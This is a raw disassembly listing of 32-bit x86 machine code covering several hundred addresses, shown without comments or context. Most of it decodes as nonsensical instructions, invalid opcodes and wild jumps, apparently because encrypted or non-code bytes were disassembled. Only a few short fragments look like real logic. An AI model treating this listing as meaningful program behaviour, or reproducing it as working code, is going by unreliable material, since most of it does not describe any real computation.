  4020bd:	dec    eax
  4020be:	mov    dh,0xab
  4020c0:	and    al,0xc5
  4020c2:	pop    es
  4020c3:	ficom  DWORD PTR [ebx+eax*1-0x43dcfcc1]
  4020ca:	cmp    DWORD PTR [ebp+0x4f],ebx
  4020cd:	outs   dx,BYTE PTR ds:[esi]
  4020ce:	popf   
  4020cf:	dec    esp
  4020d0:	(bad)  
  4020d1:	js     0x40207a
  4020d3:	test   BYTE PTR [edx-0x1687b5aa],cl
  4020d9:	push   edi
  4020da:	jge    0x402077
  4020dc:	mov    cl,0xdf
  4020de:	ja     0x4020ec
  4020e0:	add    dl,0xa2
  4020e3:	aas    
  4020e4:	jnp    0x4020b8
  4020e6:	sbb    BYTE PTR [ebx+0x24],bl
  4020e9:	jecxz  0x402142
  4020eb:	rol    DWORD PTR cs:[esi],0x22
  4020ef:	sahf   
  4020f0:	cmp    dl,BYTE PTR [eax+0xddeec8d]
  4020f6:	arpl   WORD PTR [esi-0x48],di
  4020f9:	jp     0x4020dd
  4020fb:	in     al,dx
  4020fc:	jno    0x402125
  4020fe:	and    BYTE PTR [ebp+0x2242f410],dl
  402104:	mov    ah,BYTE PTR [bp+si+0x7f8c]
  402109:	push   ebp
  40210a:	dec    eax
  40210b:	sub    al,0x4f
  40210d:	cs pop edx
  40210f:	test   bl,bl
  402111:	ins    BYTE PTR es:[edi],dx
  402112:	mov    edi,0x3d12490b
  402117:	pusha  
  402118:	(bad)  
  402119:	mov    eax,0x2725ef24
  40211e:	iret   
  40211f:	xchg   ebx,eax
  402120:	add    BYTE PTR [edi+0x56c3323],0xe4
  402127:	(bad)  
  402128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402129:	push   ecx
  40212a:	mov    edx,0x2ed9be74
  40212f:	test   al,0x8a
  402131:	mov    ebx,0xb4450553
  402136:	or     eax,0x8ad267d5
  40213b:	adc    ch,BYTE PTR cs:[eax+0x23]
  40213f:	pop    ecx
  402140:	sub    ch,BYTE PTR [esi-0x31]
  402143:	stc    
  402144:	adc    al,0x22
  402146:	sub    bl,BYTE PTR [ebx+ebp*4+0x78]
  40214a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40214b:	addr16 sub bh,dl
  40214e:	add    BYTE PTR [eax-0xe],dl
  402151:	fnsave [eax+0x53]
  402154:	xlat   BYTE PTR ds:[ebx]
  402155:	cmp    BYTE PTR [edi-0x1a],0x5
  402159:	in     eax,0x55
  40215b:	imul   DWORD PTR [edi+edx*8+0xf]
  40215f:	(bad)  
  402160:	xor    eax,0x59a8af03
  402165:	inc    esi
  402166:	mov    ebx,0xedf14513
  40216b:	iret   
  40216c:	les    edx,FWORD PTR [ebx]
  40216e:	aam    0x95
  402170:	mov    eax,ds:0x7dc79cae
  402175:	cmp    DWORD PTR [edi+0x2a],ebp
  402178:	inc    esp
  402179:	mov    bh,0xf0
  40217b:	xor    BYTE PTR [edx-0x6b],dh
  40217e:	push   eax
  40217f:	test   BYTE PTR [eax-0x2c5c9897],ah
  402185:	and    dl,dl
  402187:	retf   
  402188:	jmp    0x40214e
  40218a:	(bad)  
  40218b:	aam    0xc5
  40218d:	aad    0x19
  40218f:	int3   
  402190:	test   al,0x81
  402192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402193:	and    BYTE PTR [edi+0x33],ch
  402196:	arpl   WORD PTR [esi],ax
  402198:	xchg   ebp,eax
  402199:	adc    DWORD PTR [eax],ebx
  40219b:	stc    
  40219c:	sbb    edi,eax
  40219e:	aam    0xde
  4021a0:	jmp    0x402199
  4021a2:	hlt    
  4021a3:	add    al,0xac
  4021a5:	cmp    al,0x68
  4021a7:	inc    DWORD PTR [esi-0x1446d702]
  4021ad:	bound  ebx,QWORD PTR ds:0x3282315f
  4021b3:	jmp    0xbc43d026
  4021b8:	int    0x76
  4021ba:	mov    ecx,0xce45a379
  4021bf:	jecxz  0x402227
  4021c1:	xchg   ebx,eax
  4021c2:	jle    0x402198
  4021c4:	mov    esi,0x2da447d3
  4021c9:	in     eax,dx
  4021ca:	xlat   BYTE PTR ds:[ebx]
  4021cb:	mov    ebp,DWORD PTR [edi+0x2f]
  4021ce:	adc    eax,0x68981b1f
  4021d3:	xor    al,0x9b
  4021d5:	push   0x5e5d6ecc
  4021da:	cs add cl,al
  4021dd:	dec    edx
  4021de:	bnd jb 0x402221
  4021e1:	sbb    ebx,DWORD PTR [edi+0x38]
  4021e4:	pop    esp
  4021e5:	loopne 0x402193
  4021e7:	data16 sbb bh,BYTE PTR [edx]
  4021ea:	add    al,0xbb
  4021ec:	mov    ah,0x37
  4021ee:	out    0x23,eax
  4021f0:	cmp    cl,BYTE PTR [edx-0x1c]
  4021f3:	or     al,0xde
  4021f5:	pop    ebp
  4021f6:	cs loop 0x40225f
  4021f9:	mov    dl,0xa8
  4021fb:	dec    ebx
  4021fc:	and    BYTE PTR [ecx-0x27],bh
  4021ff:	ins    BYTE PTR es:[edi],dx
  402200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402201:	or     BYTE PTR [eax+0x2064a87e],bh
  402207:	pop    es
  402208:	shl    DWORD PTR [eax+0x1cc5324b],cl
  40220e:	mov    bl,0x1b
  402210:	pop    ecx
  402211:	addr16 xor ch,cl
  402214:	cs je  0x402231
  402217:	lock or bh,BYTE PTR [ebx]
  40221a:	fisub  WORD PTR [edx]
  40221c:	imul   edx,ecx,0x14
  40221f:	int    0x43
  402221:	pop    ebp
  402222:	push   ds
  402223:	mov    ebx,0xa207e422
  402228:	pushf  
  402229:	outs   dx,DWORD PTR fs:[esi]
  40222b:	pop    ds
  40222c:	mov    al,ds:0x2b498f7c
  402231:	dec    esp
  402232:	je     0x402200
  402234:	cmp    dl,bh
  402236:	mov    esp,0x8748c15f
  40223b:	int    0xd6
  40223d:	fstp   QWORD PTR ds:0x26d48e9f
  402243:	cwde   
  402244:	dec    edi
  402245:	jne    0x4021eb
  402247:	enter  0x921c,0x2
  40224b:	xchg   BYTE PTR [edi+0x61],bh
  40224e:	mov    WORD PTR [ebx-0x39ccf3b3],cs
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi+0x5c569d5e],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x4022d6
  4022a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a3:	clc    
  4022a4:	repz mov esp,0x253f502f
  4022aa:	rcr    BYTE PTR [eax-0x5168b98c],1
  4022b0:	out    dx,eax
  4022b1:	pop    ebx
  4022b2:	push   ds
  4022b3:	retf   0xa36e
  4022b6:	in     al,dx
  4022b7:	scas   al,BYTE PTR es:[edi]
  4022b8:	push   0x9
  4022ba:	cli    
  4022bb:	jnp    0x40224f
  4022bd:	dec    esi
  4022be:	mov    bh,0x25
  4022c0:	das    
  4022c1:	pop    edi
  4022c2:	pop    edx
  4022c3:	pop    esi
  4022c4:	mul    DWORD PTR [esi-0x10a34629]
  4022ca:	stos   DWORD PTR es:[edi],eax
  4022cb:	adc    ecx,DWORD PTR [ecx+0x1b5cdb9c]
  4022d1:	cwde   
  4022d2:	ins    DWORD PTR es:[edi],dx
  4022d3:	imul   ecx,DWORD PTR [edi+0xb],0xffffffab
  4022d7:	ins    DWORD PTR es:[edi],dx
  4022d8:	imul   edx,DWORD PTR [ebp-0xefb8a04],0x5c
  4022df:	call   0xd0d6:0x2eb0d616
  4022e6:	js     0x402289
  4022e8:	adc    BYTE PTR [ecx],dl
  4022ea:	loope  0x4022a9
  4022ec:	jo     0x40234f
  4022ee:	lods   al,BYTE PTR ds:[esi]
  4022ef:	jg     0x402338
  4022f1:	sbb    BYTE PTR [eax+0x4f],cl
  4022f4:	push   0x342b83c9
  4022f9:	push   edx
  4022fa:	xchg   edx,ebp
  4022fc:	sub    ch,BYTE PTR [ebp-0x31b36a3a]
  402302:	dec    esp
  402303:	fcmovu st,st(4)
  402305:	es mov esp,0x784d230
  40230b:	sub    DWORD PTR [edi+0x3d],0xffffffd4
  40230f:	and    eax,0xa54ae4af
  402314:	push   ebx
  402315:	adc    BYTE PTR [edi-0x78],bh
  402318:	xchg   edx,eax
  402319:	test   DWORD PTR [edx+0x5e8d9851],0xb5da82
  402323:	pop    esi
  402324:	jb     0x4022c6
  402326:	mov    ebp,0x38107213
  40232b:	pop    esp
  40232c:	(bad)  
  40232d:	sbb    DWORD PTR [ecx],edx
  40232f:	out    0x5e,eax
  402331:	adc    cl,BYTE PTR [edi-0x70fee7d]
  402337:	jl     0x40236b
  402339:	fidiv  DWORD PTR [esi-0x63]
  40233c:	test   BYTE PTR [edi+0x47],al
  40233f:	test   BYTE PTR [esi],bl
  402341:	sub    edx,edx
  402343:	xchg   esp,eax
  402344:	xchg   ebp,eax
  402345:	jo     0x4023a1
  402347:	out    0xf3,al
  402349:	dec    eax
  40234a:	xchg   BYTE PTR [edx+0x37],bh
  40234d:	adc    DWORD PTR [ecx+0x6cb26560],eax
  402353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402354:	and    dl,BYTE PTR [edi+0x3f]
  402357:	push   esp
  402358:	inc    esp
  402359:	jae    0x402369
  40235b:	fcom   DWORD PTR [ebx]
  40235d:	rcr    dh,1
  40235f:	js     0x402307
  402361:	cwde   
  402362:	push   0xfffffff7
  402364:	jns    0x402314
  402366:	pop    ebp
  402367:	jne    0x402308
  402369:	push   ebp
  40236a:	leave  
  40236b:	in     al,dx
  40236c:	dec    ebx
  40236d:	adc    DWORD PTR [esi+0x59],edi
  402370:	fimul  WORD PTR [ebp-0x47f18e01]
  402376:	push   esi
  402377:	pop    eax
  402378:	bound  eax,QWORD PTR [eax+0x62]
  40237b:	sbb    BYTE PTR [edx],cl
  40237d:	cld    
  40237e:	and    esp,DWORD PTR [ebp+0x5f]
  402381:	aam    0xa0
  402383:	or     DWORD PTR [eax-0x65f32724],0x64f476a
  40238d:	icebp  
  40238e:	repz add ah,bh
  402391:	cs sbb eax,0xd7c3dbd
  402397:	sub    eax,DWORD PTR [edi]
  402399:	cwde   
  40239a:	sahf   
  40239b:	inc    esi
  40239c:	cli    
  40239d:	ja     0x40236c
  40239f:	mov    bh,0x4f
  4023a1:	outs   dx,DWORD PTR ds:[esi]
  4023a2:	push   ebx
  4023a3:	lods   al,BYTE PTR ds:[esi]
  4023a4:	mov    eax,0x39b9a47c
  4023a9:	cmp    DWORD PTR [eax+edx*2+0x3a],ebp
  4023ad:	imul   ecx,edx,0xffffffe6
  4023b0:	ss mov esp,0x1eeb6ef9
  4023b6:	cmp    cl,bl
  4023b8:	dec    edi
  4023b9:	jb     0x4023e1
  4023bb:	in     eax,0x73
  4023bd:	sub    ch,bh
  4023bf:	adc    eax,0x64bf53a9
  4023c4:	mov    es,WORD PTR [esi]
  4023c6:	sbb    ebx,DWORD PTR [esi+0x412a4a3e]
  4023cc:	in     al,0x1d
  4023ce:	pop    ss
  4023cf:	jbe    0x4023a8
  4023d1:	pop    ebx
  4023d2:	data16 (bad) 
  4023d4:	push   ebp
  4023d5:	out    0x46,al
  4023d7:	xlat   BYTE PTR ds:[ebx]
  4023d8:	lock div BYTE PTR [edx+0x48]
  4023dc:	cs and al,0xf2
  4023df:	test   al,0xca
  4023e1:	add    ebx,DWORD PTR [esi+0x62cea6d6]
  4023e7:	call   FWORD PTR [esi]
  4023e9:	aaa    
  4023ea:	stos   DWORD PTR es:[edi],eax
  4023eb:	mov    ebp,0x28b16c93
  4023f0:	push   0xffffff9c
  4023f2:	mov    esi,0xe8da50b
  4023f7:	les    edi,FWORD PTR [edx+0x54]
  4023fa:	outs   dx,DWORD PTR ds:[esi]
  4023fb:	or     DWORD PTR [ecx-0x5d98936e],edi
  402401:	xchg   ebx,eax
  402402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402403:	push   ecx
  402404:	(bad)  
  402405:	mov    edx,0x9a8d7b0a
  40240a:	sub    esi,ebx
  40240c:	push   eax
  40240d:	dec    esp
  40240e:	sbb    al,0x51
  402410:	dec    esi
  402411:	cmp    dl,BYTE PTR [ebp+0x75]
  402414:	call   0x640c:0x17b18619
  40241b:	inc    ebp
  40241c:	aam    0x2c
  40241e:	les    ecx,FWORD PTR [esi-0x7a]
  402421:	mov    ch,0x51
  402423:	ficom  DWORD PTR [esi-0x26b12ff1]
  402429:	push   esi
  40242a:	icebp  
  40242b:	out    dx,eax
  40242c:	cmp    ch,cl
  40242e:	pop    esi
  40242f:	aad    0xb
  402431:	das    
  402432:	addr16 xor eax,0x34ca71b
  402438:	jl     0x402472
  40243a:	jl     0x40245f
  40243c:	pop    edi
  40243d:	fmul   QWORD PTR [ebp+0x47aada60]
  402443:	jle    0x4024b0
  402445:	mov    ch,0x46
  402447:	repnz push es
  402449:	fnstcw WORD PTR [edx]
  40244b:	adc    al,0xdf
  40244d:	adc    DWORD PTR [edx],0xc0a38937
  402453:	dec    esp
  402454:	imul   BYTE PTR [eax+ecx*4-0x3b14ae5d]
  40245b:	sbb    DWORD PTR [ecx+edx*2-0x19],eax
  40245f:	add    eax,ebp
  402461:	adc    bh,BYTE PTR [edx+0x1c]
  402464:	inc    ecx
  402465:	xor    dh,bl
  402467:	or     esp,DWORD PTR [edx+ebx*1]
  40246a:	cld    
  40246b:	mov    bl,0xf4
  40246d:	fucom  st(2)
  40246f:	fisttp DWORD PTR [edx+0x6e]
  402472:	in     al,dx
  402473:	or     DWORD PTR [esi+0x59186cc],esi
  402479:	shl    BYTE PTR [ebx],1
  40247b:	xchg   ecx,eax
  40247c:	sub    esi,DWORD PTR [ebx+0x78fc39c8]
  402482:	jmp    0x18cde124
  402487:	jbe    0x402457
  402489:	lea    esi,[eax]
  40248b:	cwde   
  40248c:	lods   al,BYTE PTR ds:[esi]
  40248d:	dec    ebp
  40248e:	jge    0x40246c
  402490:	inc    esp
  402491:	mov    dl,BYTE PTR [ebx+0x4d8cd059]
  402497:	jo     0x4024ab
  402499:	sub    DWORD PTR [edx-0x2a],0x41
  40249d:	pop    esi
  40249e:	fild   QWORD PTR ds:0xdce62945
  4024a4:	xor    BYTE PTR [ecx+0x65],dl
  4024a7:	ja     0x4024e0
  4024a9:	sub    DWORD PTR [eax],ebx
  4024ab:	adc    bl,ch
  4024ad:	or     BYTE PTR [ebp-0x47c8d4cb],ah
  4024b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024b4:	les    esp,FWORD PTR [edi]
  4024b6:	xchg   edi,eax
  4024b7:	in     eax,0x0
  4024b9:	jmp    DWORD PTR ds:0x1538e01a
  4024bf:	mov    ah,0xc3
  4024c1:	mov    eax,ds:0x4470324b
  4024c6:	xor    ebp,DWORD PTR [edi+ebp*8]
  4024c9:	adc    al,0xd9
  4024cb:	ins    BYTE PTR es:[edi],dx
  4024cc:	fdivr  QWORD PTR [edx]
  4024ce:	ins    BYTE PTR es:[edi],dx
  4024cf:	loopne 0x402453
  4024d1:	and    DWORD PTR [ebx+0x5ddc02e5],ebx
  4024d7:	dec    edi
  4024d8:	mov    cl,ch
  4024da:	lods   al,BYTE PTR ds:[esi]
  4024db:	push   eax
  4024dc:	jmp    DWORD PTR [ebx]
  4024de:	push   esp
  4024df:	push   edi
  4024e0:	xchg   esp,eax
  4024e1:	cmc    
  4024e2:	pop    ss
  4024e3:	mov    ds:0x371fd61b,al
  4024e8:	scas   eax,DWORD PTR es:[edi]
  4024e9:	out    dx,eax
  4024ea:	pusha  
  4024eb:	cdq    
  4024ec:	cli    
  4024ed:	xlat   BYTE PTR ds:[ebx]
  4024ee:	jne    0x4024f7
  4024f0:	int    0xe0
  4024f2:	mov    ebp,0x42b5dcaf
  4024f7:	cli    
  4024f8:	xrelease xchg DWORD PTR es:[ecx],ecx
  4024fc:	(bad)  
  4024fd:	hlt    
  4024fe:	cwde   
  4024ff:	dec    esp
  402500:	jp     0x4024dc
  402502:	mov    DWORD PTR [edx],esp
  402504:	mov    dh,0xec
  402506:	scas   eax,DWORD PTR es:[edi]
  402507:	call   0x89d6714
  40250c:	inc    edi
  40250d:	cmp    eax,0xfe556eef
  402512:	retf   0x2cc7
  402515:	xor    edx,DWORD PTR [ecx+0x73]
  402518:	xor    al,0x22
  40251a:	out    0x30,eax
  40251c:	cmp    eax,0x96e5e341
  402521:	in     eax,0x6
  402523:	inc    edi
  402524:	add    DWORD PTR [edi+edi*8-0x22a1c3fc],ebp
  40252b:	sub    al,0xeb
  40252d:	adc    al,0xa
  40252f:	xor    DWORD PTR [ebp+0x773bdfc3],edx
  402535:	dec    ebp
  402536:	sub    BYTE PTR [edx],dl
  402538:	dec    ecx
  402539:	add    ebp,DWORD PTR [esi-0x46]
  40253c:	loop   0x4025aa
  40253e:	dec    edx
  40253f:	fisubr DWORD PTR [ecx]
  402541:	call   0x4dfd:0x8876b75d
  402548:	sahf   
  402549:	popa   
  40254a:	das    
  40254b:	test   eax,0xe46a93b1
  402550:	shl    BYTE PTR [edx+0xb],0x21
  402554:	xor    BYTE PTR es:[ebx],bh
  402557:	popf   
  402558:	adc    eax,0x38bd68db
  40255d:	lahf   
  40255e:	sbb    al,0x8d
  402560:	outs   dx,BYTE PTR ds:[esi]
  402561:	mov    esp,0xd3a1252b
  402566:	inc    ecx
  402567:	fcmovb st,st(0)
  402569:	adc    dh,dh
  40256b:	lock xchg ecx,eax
  40256d:	sahf   
  40256e:	mov    edi,0x225c7faa
  402573:	ds push edi
  402575:	push   ebx
  402576:	cmp    eax,0x16626814
  40257b:	js     0x402534
  40257d:	mov    bl,0x9b
  40257f:	cmp    eax,0xd0aeb20d
  402584:	test   DWORD PTR [esi+eax*2-0x57],ecx
  402588:	ins    DWORD PTR es:[edi],dx
  402589:	div    DWORD PTR [ebx]
  40258b:	(bad)  
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	out    0x40,al
  4025af:	mov    ecx,0x7c0fea77
  4025b4:	jl     0x40261d
  4025b6:	jle    0x402634
  4025b8:	jl     0x402547
  4025ba:	and    BYTE PTR [edi-0x44],dh
  4025bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025be:	jmp    0x4025d7
  4025c0:	xor    eax,0xd977fffb
  4025c5:	in     eax,dx
  4025c6:	adc    ecx,DWORD PTR ds:0x1e847a92
  4025cc:	stc    
  4025cd:	xchg   DWORD PTR [ecx-0x24c670d7],esp
  4025d3:	cmp    bl,ah
  4025d5:	dec    ebp
  4025d6:	push   es
  4025d7:	fdivp  st(7),st
  4025d9:	push   edx
  4025da:	enter  0x7088,0x5c
  4025de:	dec    esp
  4025df:	call   0xf8e7:0x1496ef57
  4025e6:	mov    edx,0xa2200851
  4025eb:	jns    0x402600
  4025ed:	jae    0x4025e5
  4025ef:	mov    cl,BYTE PTR [ebp+0x52]
  4025f2:	lahf   
  4025f3:	cmp    ah,bl
  4025f5:	stc    
  4025f6:	stos   DWORD PTR es:[edi],eax
  4025f7:	sub    al,0x95
  4025f9:	add    eax,0x3d800cd5
  4025fe:	adc    eax,0xda741752
  402603:	psubsw mm7,mm6
  402606:	fs retf 
  402608:	mov    esp,0x1c78f79e
  40260d:	(bad)  
  40260e:	mov    eax,ds:0x47c63425
  402613:	outs   dx,BYTE PTR ds:[esi]
  402614:	call   0x626e:0xb9d577e9
  40261b:	and    eax,0xba51c51c
  402620:	xor    eax,0xac7dfd70
  402625:	scas   al,BYTE PTR es:[edi]
  402626:	mov    BYTE PTR [eax+0x59f3449d],bh
  40262c:	scas   al,BYTE PTR es:[edi]
  40262d:	stc    
  40262e:	cmp    dl,dh
  402630:	or     eax,0x2d4508bc
  402635:	lahf   
  402636:	scas   al,BYTE PTR es:[edi]
  402637:	fs sub eax,0x98ec42c
  40263d:	sub    dh,bh
  40263f:	outs   dx,BYTE PTR ds:[esi]
  402640:	sub    DWORD PTR [edx-0x30],ecx
  402643:	inc    ebp
  402644:	(bad)  
  402645:	and    eax,0x5b2457c4
  40264a:	sbb    eax,0xb820fe36
  40264f:	or     eax,0xe3379929
  402654:	cld    
  402655:	ror    BYTE PTR [ecx],cl
  402657:	aaa    
  402658:	fild   WORD PTR [esi]
  40265a:	daa    
  40265b:	jp     0x402661
  40265d:	lods   al,BYTE PTR ds:[esi]
  40265e:	and    ebp,DWORD PTR [eax]
  402660:	add    al,0x2a
  402662:	ins    DWORD PTR es:[edi],dx
  402663:	mov    ch,0x62
  402665:	push   es
  402666:	mov    eax,0xca0efef0
  40266b:	dec    ecx
  40266c:	rcr    DWORD PTR ds:0x55c38ff5,1
  402672:	mov    dh,0x9d
  402674:	add    bl,dh
  402676:	ror    DWORD PTR [ebx],cl
  402678:	add    eax,0x8dd6ccb5
  40267d:	dec    esi
  40267e:	sub    DWORD PTR [ecx-0x272fcce],esi
  402684:	sbb    esi,DWORD PTR [edi]
  402686:	shl    DWORD PTR [eax+eiz*4+0x2],0xde
  40268b:	dec    edi
  40268c:	mov    eax,ds:0x4f0a719b
  402691:	enter  0x9764,0xe2
  402695:	pop    eax
  402696:	jle    0x402682
  402698:	mov    edi,0xb3957775
  40269d:	jg     0x402668
  40269f:	repnz inc eax
  4026a1:	int3   
  4026a2:	les    edx,FWORD PTR [edi+0x75]
  4026a5:	cmp    DWORD PTR [ecx+ebp*1+0x6c80107e],0xffffffa0
  4026ad:	cmp    dl,dl
  4026af:	xchg   ebx,eax
  4026b0:	inc    esp
  4026b1:	cmp    esp,DWORD PTR [edx]
  4026b3:	iret   
  4026b4:	mov    edi,0x314117df
  4026b9:	stos   BYTE PTR es:[edi],al
  4026ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026bb:	cmp    eax,0x1fdae7c9
  4026c0:	and    bh,bh
  4026c2:	shl    bl,0x54
  4026c5:	sbb    al,0xc0
  4026c7:	sub    eax,0x2a3a54ba
  4026cc:	not    DWORD PTR [edi]
  4026ce:	cwde   
  4026cf:	loop   0x40269b
  4026d1:	mov    al,0x4e
  4026d3:	lods   eax,DWORD PTR ds:[esi]
  4026d4:	mov    al,ds:0x65ecac9a
  4026d9:	call   0x2342d5ca
  4026de:	sub    al,0x43
  4026e0:	push   ss
  4026e1:	stc    
  4026e2:	jmp    0x1039f808
  4026e7:	(bad)  
  4026e8:	jbe    0x402750
  4026ea:	push   ds
  4026eb:	loop   0x4026ce
  4026ed:	adc    al,0x21
  4026ef:	stos   DWORD PTR es:[edi],eax
  4026f0:	add    dh,BYTE PTR [ebx]
  4026f2:	sub    al,0x1b
  4026f4:	into   
  4026f5:	cmp    ch,BYTE PTR [ebp+edi*8-0x8109aed]
  4026fc:	mov    edi,ebp
  4026fe:	(bad)  
  4026ff:	sbb    al,0x3e
  402701:	mov    dl,0xa8
  402703:	mov    es,edi
  402705:	sbb    bh,al
  402707:	push   ebx
  402708:	dec    esi
  402709:	aad    0x56
  40270b:	inc    edi
  40270c:	xor    eax,0x4f76edcb
  402711:	push   esp
  402712:	ror    DWORD PTR [ebp+ebp*4+0x4a],0x43
  402717:	int3   
  402718:	out    dx,al
  402719:	cmp    dl,BYTE PTR [eax+0x4a]
  40271c:	test   al,0x98
  40271e:	sbb    al,0x16
  402720:	in     eax,dx
  402721:	mov    esp,DWORD PTR [eax+0x7e]
  402724:	sti    
  402725:	or     BYTE PTR [ecx],dh
  402727:	cmp    DWORD PTR [ebx+esi*4-0x71c882a8],edx
  40272e:	or     al,al
  402730:	ins    BYTE PTR es:[edi],dx
  402731:	int3   
  402732:	xchg   esi,eax
  402733:	jns    0x4026bc
  402735:	add    eax,esp
  402737:	cmp    DWORD PTR [ecx+0x7a],0xeba63c92
  40273e:	(bad)  
  40273f:	mov    ds:0x2c164cd5,al
  402744:	push   edi
  402745:	jl     0x40272e
  402747:	sar    BYTE PTR [edx-0x73],1
  40274a:	sbb    eax,0x1287dbc
  40274f:	test   BYTE PTR [edx+0x881cce1],ah
  402755:	outs   dx,BYTE PTR ds:[esi]
  402756:	out    0x49,al
  402758:	in     al,dx
  402759:	cmp    eax,0x4e5ceb8a
  40275e:	test   al,0xe3
  402760:	jge    0x4026e3
  402762:	mov    dl,0xd4
  402764:	ins    BYTE PTR es:[edi],dx
  402765:	sbb    ebp,DWORD PTR [edi-0xc]
  402768:	and    cl,ah
  40276a:	into   
  40276b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40276c:	sub    edi,esi
  40276e:	mov    ah,0x73
  402770:	sbb    eax,0xb4c7d028
  402775:	xchg   esp,eax
  402776:	idiv   ecx
  402778:	daa    
  402779:	stos   BYTE PTR es:[edi],al
  40277a:	addr16 (bad) 
  40277c:	adc    BYTE PTR [ecx+0x32],bh
  40277f:	(bad)  
  402780:	dec    ebx
  402781:	lods   al,BYTE PTR ds:[esi]
  402782:	aaa    
  402783:	shl    dh,1
  402785:	and    dh,BYTE PTR [eax-0x204fceef]
  40278b:	loop   0x402797
  40278d:	mov    dl,0x27
  40278f:	sbb    al,BYTE PTR [edi-0x73c9c68f]
  402795:	mov    ecx,0xee81a001
  40279a:	mov    al,ds:0x1285835e
  40279f:	fisubr DWORD PTR [esi]
  4027a1:	in     al,0xd7
  4027a3:	inc    edx
  4027a4:	je     0x402764
  4027a6:	sub    bl,BYTE PTR [ecx]
  4027a8:	push   esp
  4027a9:	cli    
  4027aa:	imul   esp,DWORD PTR [ebp-0x79db75bb],0x360966df
  4027b4:	xor    cl,BYTE PTR ds:0x4ac39bcc
  4027ba:	inc    ebx
  4027bb:	ins    BYTE PTR es:[edi],dx
  4027bc:	xor    BYTE PTR [ecx-0x59911a98],al
  4027c2:	xor    DWORD PTR [ebp+0x60c1b79b],eax
  4027c8:	retf   
  4027c9:	xchg   ecx,eax
  4027ca:	mov    eax,ds:0x477657d4
  4027cf:	inc    edi
  4027d0:	pop    ds
  4027d1:	jo     0x4027f8
  4027d3:	ror    BYTE PTR [esi+0x6b229fd6],0x52
  4027da:	clc    
  4027db:	add    bh,BYTE PTR ds:0x286002bb
  4027e1:	and    edi,DWORD PTR [eax-0x4b]
  4027e4:	dec    ecx
  4027e5:	cmp    al,0xfe
  4027e7:	fld    DWORD PTR [ebx+0x7c7a4677]
  4027ed:	lds    edx,FWORD PTR [ecx+0x6ea7f24f]
  4027f3:	dec    esi
  4027f4:	sbb    eax,0xb460ce55
  4027f9:	push   ebp
  4027fa:	ret    0xecf8
  4027fd:	add    BYTE PTR [edi-0x38],al
  402800:	stos   DWORD PTR es:[edi],eax
  402801:	icebp  
  402802:	jmp    0x402846
  402804:	pop    eax
  402805:	out    dx,eax
  402806:	sub    al,0xa7
  402808:	fcomip st,st(3)
  40280a:	or     ecx,edx
  40280c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40280d:	xchg   edi,eax
  40280e:	add    BYTE PTR [edi-0x7f],al
  402811:	sub    ch,BYTE PTR [eax+0x22]
  402814:	cdq    
  402815:	in     eax,dx
  402816:	popa   
  402817:	push   ecx
  402818:	loop   0x402804
  40281a:	inc    eax
  40281b:	sub    al,BYTE PTR [ecx]
  40281d:	and    DWORD PTR [eax+0x52],esp
  402820:	test   BYTE PTR [esi],0x5d
  402823:	jbe    0x4027f2
  402825:	(bad)  
  402826:	adc    bl,BYTE PTR [esp+edx*4-0x1553b4b1]
  40282d:	jecxz  0x4027d2
  40282f:	dec    ebp
  402830:	add    DWORD PTR [esi-0x61],edi
  402833:	imul   edi,DWORD PTR [ecx],0xc38dd1fd
  402839:	inc    ecx
  40283a:	pop    ebp
  40283b:	jecxz  0x40286c
  40283d:	jecxz  0x402897
  40283f:	push   0xeb37f018
  402844:	(bad)  
  402845:	pop    ss
  402846:	out    dx,eax
  402847:	shl    DWORD PTR [esi-0x50f20fdf],1
  40284d:	pop    esi
  40284e:	sbb    DWORD PTR [ecx+ebx*8],ebx
  402851:	ja     0x4027ed
  402853:	and    ecx,ebp
  402855:	add    dl,BYTE PTR [ebp*8-0x26d89869]
  40285c:	mov    esi,0x8fa52318
  402861:	or     eax,0x18e3f882
  402866:	stc    
  402867:	dec    esi
  402868:	sti    
  402869:	jl     0x4027fb
  40286b:	sbb    dl,BYTE PTR [esi*4+0x23301d0d]
  402872:	add    cl,ch
  402874:	inc    edx
  402875:	fstp   DWORD PTR [eax+0x1e45e3bb]
  40287b:	call   0xf419:0xae0c31ad
  402882:	mov    WORD PTR [edi-0x60],?
  402885:	retf   
  402886:	outs   dx,BYTE PTR ds:[esi]
  402887:	mov    dl,0xd6
  402889:	popf   
  40288a:	mov    ebx,0x3e2047a1
  40288f:	jno    0x402885
  402891:	shr    DWORD PTR [edi],0xa3
  402894:	add    al,BYTE PTR [ecx+0x5b]
  402897:	daa    
